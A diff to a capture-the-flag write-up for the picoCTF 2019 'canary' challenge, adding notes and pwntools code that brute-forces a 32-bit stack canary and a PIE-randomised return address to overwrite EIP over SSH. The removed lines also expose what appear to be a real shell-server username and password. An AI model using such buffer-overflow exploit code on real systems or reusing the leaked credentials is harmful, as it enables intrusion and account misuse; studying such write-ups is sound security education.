@@ -106,6 +106,9 @@ As mentioned earlier - since this is 32-bit we can actually brute-force it. Just
 
 The distance to `$eip` can be found through earlier tricks - `cyclic`, using a disassembler, etc. Just make sure you set the size before if you're dynamically analyzing.
 Note, the canary in the file doesn't change - once you cleared the brute-forcing and run into an error after, you can just create a script that skips the actual brute-forcing and instead go straight to overriding the `$eip`.
+
+Through `checksec` we can see that PIE has been enabled. This means it won't be as easy to get to the location of the `display_flag()` function. However this can be brute-forced as well. Just run it through with the address `0x7ed` until a hint of pico is found in the return string and you should have it. 
+
 ```c
 from pwn import *
 
@@ -120,14 +123,13 @@ canary_eip = 16 # canary to eip
 #display_flag = 0x5655636d # address of display_flag
 display_flag = 0x7ed
 
-s = ssh(host='2019shell1.picoctf.com',user='ehpp19706779',password='Mrniceguy!123')
+s = ssh(host='2019shell1.picoctf.com',user='Username',password='Password')
 
 # looping through all possible bytes for the 4 bytes (32-bit) in canary
 for i in range(4):
 	for j in range(256):
 		# set up connection and cd into correct directory
 		p = s.process('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln', cwd='/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe')
-		#p = process('./test')
 
 		#p.recv()
 		#p.sendline(b'1234')
@@ -156,14 +158,10 @@ for i in range(4):
 
 print("Brute forcing canary successful.\nCanary value is:", canary, "\n")
 
-#e = ELF('./test')
-#e = ELF('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln')
-#gdb.attach(p, gdbscript='continue')
-
 flag = ""
 
+# brute forcing display_flag() address
 while "pico" not in flag:
-	#p = process('./test')
 	p = s.process('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln', cwd='/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe')
 	
 	# real payload
